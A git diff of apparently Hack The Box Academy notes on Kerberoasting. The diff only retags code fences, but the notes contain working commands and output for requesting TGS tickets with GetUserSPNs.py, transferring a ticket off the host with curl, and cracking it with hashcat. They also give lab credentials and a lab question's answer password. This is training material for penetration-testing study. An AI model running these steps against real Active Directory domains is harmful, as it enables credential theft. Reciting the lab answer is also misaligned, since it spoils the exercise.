@@ -29,20 +29,20 @@ Obtaining a TGS ticket via Kerberoasting does not guarantee you a set of valid c
 
 ### Installing Impacket using Pip
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ sudo python3 -m pip install .
 ```
 
 ### Listing SPN Accounts with GetUserSPNs.py
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
 ```
 
 ### Requesting all TGS Tickets
 We can now pull all TGS tickets for offline processing using the `-request` flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or John the Ripper for offline password cracking attempts.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
 
 Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation
@@ -68,7 +68,7 @@ $krb5tgs$23$*SOLARWINDSMONITOR$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SOLARWIND
 ### Requesting a Single TGS ticket
 We can also be more targeted and request just the TGS ticket for a specific account. Let's try requesting one for just the `sqldev` account.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
 
 Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation
@@ -86,7 +86,7 @@ $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$4ce5b71188b3
 ### Saving the TGS Ticket to an Output File
 Here we've written the TGS ticket for the `sqldev` user to a file named `sqldev_tgs`. 
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
 
 Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation
@@ -99,7 +99,7 @@ MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev  CN=Domain Admins,CN=Users
 
 ### Cracking the Ticket Offline with Hashcat
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
 
 hashcat (v6.1.1) starting...
@@ -132,7 +132,7 @@ Stopped: Tue Feb 15 17:45:41 2022
 SSH to **10.129.42.143** (ACADEMY-EA-ATTACK01), with user `htb-student` and password `HTB_@cademy_stdnt!`
 1. Retrieve the TGS ticket for the SAPService account. Crack the ticket offline and submit the password as your answer. **Answer: !SapperFi2**
    - Request and save the SAPService account's TGS ticket into `sap_tgs` file (use this credential `forend`:`Klmcargo2`):
-        ```sh
+        ```shellsession
         $GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user SAPService -outputfile sap_tgs
         Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
 
@@ -142,7 +142,7 @@ SSH to **10.129.42.143** (ACADEMY-EA-ATTACK01), with user `htb-student` and pass
         SAPService/srv01.inlanefreight.local  SAPService  CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL  2022-04-18 14:40:02.959792  <never>
         ```
    - Transfer the TGS ticket to attacker host and crack it offline:
-        ```sh
+        ```shellsession
         $ curl http://10.129.42.143:8000/sap_tgs > sap_tgs
         $ hashcat -m 13100 sap_tgs /usr/share/wordlists/rockyou.txt
         <SNIP>
